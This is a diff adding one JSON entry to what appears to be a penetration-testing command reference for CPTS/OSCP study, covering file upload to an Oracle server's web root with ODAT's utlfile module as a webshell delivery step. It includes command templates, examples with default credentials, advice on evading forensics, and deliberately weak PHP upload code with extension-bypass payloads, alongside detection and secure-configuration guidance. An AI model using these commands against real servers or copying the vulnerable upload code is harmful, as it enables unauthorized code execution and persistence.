@@ -1,0 +1,120 @@
+{
+  "id": "oracle-tns-file-upload",
+  "name": "Oracle TNS - File Upload via ODAT UTL_FILE",
+  "command": "./odat.py utlfile -s <ip> -d <sid> -U <user> -P <password> --sysdba --putFile <remote_dir> <remote_filename> <file>",
+  "description": "Uploads a local file to the Oracle server filesystem using ODAT's utlfile module (Oracle UTL_FILE PL/SQL package). Writing to the web root drops a web-accessible file — use as a webshell delivery primitive.",
+  "type": "command",
+  "platform": "linux",
+  "category": "Enumeration",
+  "subcategory": "Oracle TNS",
+  "opsec": "loud",
+  "tools": [
+    "odat",
+    "curl"
+  ],
+  "protocols": [
+    "oracle-tns"
+  ],
+  "tags": [
+    "oracle",
+    "odat",
+    "file-upload",
+    "utlfile",
+    "webshell"
+  ],
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 04: Footprinting",
+  "mitre": [
+    "T1105",
+    "T1505.003"
+  ],
+  "requires": [
+    "credentials"
+  ],
+  "variations": [
+    {
+      "label": "Default (sysdba, put file)",
+      "command": "./odat.py utlfile -s <ip> -d <sid> -U <user> -P <password> --sysdba --putFile <remote_dir> <remote_filename> <file>"
+    },
+    {
+      "label": "Without sysdba (limited-priv account)",
+      "command": "./odat.py utlfile -s <ip> -d <sid> -U <user> -P <password> --putFile <remote_dir> <remote_filename> <file>"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Create a benign test file locally",
+      "command": "echo 'Oracle UTL_FILE upload test' > testing.txt"
+    },
+    {
+      "label": "Upload file to Windows web root (IIS)",
+      "command": "./odat.py utlfile -s <ip> -d <sid> -U <user> -P <password> --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt"
+    },
+    {
+      "label": "Verify file is web-accessible",
+      "command": "curl -X GET http://<ip>/testing.txt"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Upload test file to IIS web root (Windows)",
+      "command": "./odat.py utlfile -s <ip> -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt"
+    },
+    {
+      "label": "Upload test file to Apache web root (Linux)",
+      "command": "./odat.py utlfile -s <ip> -d XE -U scott -P tiger --sysdba --putFile /var/www/html testing.txt ./testing.txt"
+    },
+    {
+      "label": "Verify uploaded file via HTTP",
+      "command": "curl -X GET http://<ip>/testing.txt"
+    }
+  ],
+  "notes": "Requires SYSDBA privileges or an account with UTL_FILE execute grants.\nDefault web roots: Windows C:\\inetpub\\wwwroot (IIS), Linux /var/www/html (Apache/nginx).\nTest with a plain text file first; escalate to a .aspx/.php webshell only after confirming write+serve.\nThe Oracle process user must have write permission to the target directory.\nRefer to oracle-tns-enum and oracle-tns-setup for prerequisites (SID discovery + ODAT install).",
+  "recommended": [
+    {
+      "id": "oracle-tns-enum",
+      "note": "Enumerate Oracle, discover SID and valid creds before this step",
+      "rel": "prereq"
+    },
+    {
+      "id": "oracle-tns-setup",
+      "note": "Install ODAT and sqlplus dependencies first",
+      "rel": "prereq"
+    }
+  ],
+  "references": [
+    {
+      "title": "ODAT - Oracle Database Attacking Tool (GitHub)",
+      "url": "https://github.com/quentinhardy/odat"
+    },
+    {
+      "title": "HTB Academy - Footprinting",
+      "url": "https://academy.hackthebox.com/module/details/112"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Adversaries upload web shell files (PHP, JSP, ASP scripts) to web server directories to gain persistent server-side code execution via HTTP requests. Once planted, the web shell persists across reboots and allows arbitrary command execution under the web server's account — providing a covert, browser-accessible backdoor that blends with legitimate web traffic.",
+    "prerequisites": "Valid Oracle database credentials with sufficient privileges (e.g. to use UTL_FILE or DBMS procedures).",
+    "impact": "A web shell or arbitrary file written to the server filesystem, yielding server-side code execution.",
+    "detection": "Monitor for unexpected file creation in web directories (e.g., /var/www/html) followed by the web server process (Apache, nginx, IIS) spawning command shells or script interpreters. File creation of unauthorized script files (.php, .sh, .asp) in web directories is a primary indicator.",
+    "artifacts": "A new file on the server; Oracle audit records of UTL_FILE / procedure execution; the web server spawning shell children if the file is a web shell.",
+    "prevention": "Consider disabling dangerous web server functions like PHP's eval() that can be abused to execute web shells. Enforce least privilege so that only authorized accounts can write to web directories. Audit web directory permissions and remove write access for the web server process itself.",
+    "evasion": "Write a minimal, obfuscated web shell rather than a large payload, use the database's own file-write primitives (living off the DB) instead of an external transfer, and remove the uploaded file once execution is achieved to limit forensic traces.",
+    "sources": [
+      "MITRE T1505.003",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "The application allows file uploads but validates only the filename extension or MIME type on the client side (or uses a blocklist instead of allowlist). An attacker can bypass extension filters by double extensions (.php.jpg), null bytes, or case manipulation, and upload webshells that execute server-side code. The upload directory may also be within the web root and executable by the web server.",
+    "vulnerable_config": "# PHP — blocklist validation (easily bypassed):\n$blocked = ['php', 'php3', 'php4', 'phtml'];\n$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);\nif (in_array(strtolower($ext), $blocked)) {\n    die('File type not allowed');\n}\nmove_uploaded_file($_FILES['file']['tmp_name'], '/var/www/html/uploads/' . $_FILES['file']['name']);\n# Bypass: upload shell.php5, shell.pHp, shell.php.jpg, shell.php%00.jpg\n# File lands in web root -> execute as PHP",
+    "secure_config": "# PHP — allowlist validation + store outside web root:\n$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];\n$allowed_exts  = ['jpg', 'jpeg', 'png', 'gif'];\n\n// Validate MIME type using fileinfo (server-side, not client-supplied):\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);\nif (!in_array($mime, $allowed_types)) { die('Invalid file type'); }\n\n$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\nif (!in_array($ext, $allowed_exts)) { die('Invalid extension'); }\n\n// Store OUTSIDE web root with a random name:\n$dest = '/var/uploads/' . bin2hex(random_bytes(16)) . '.' . $ext;\nmove_uploaded_file($_FILES['file']['tmp_name'], $dest);\n\n// Serve via a download script (X-Accel-Redirect or readfile()) — not directly\n\n// nginx — disable script execution in upload directory:\nlocation /uploads/ {\n    location ~* \\.php$ { deny all; }\n}"
+  }
+}
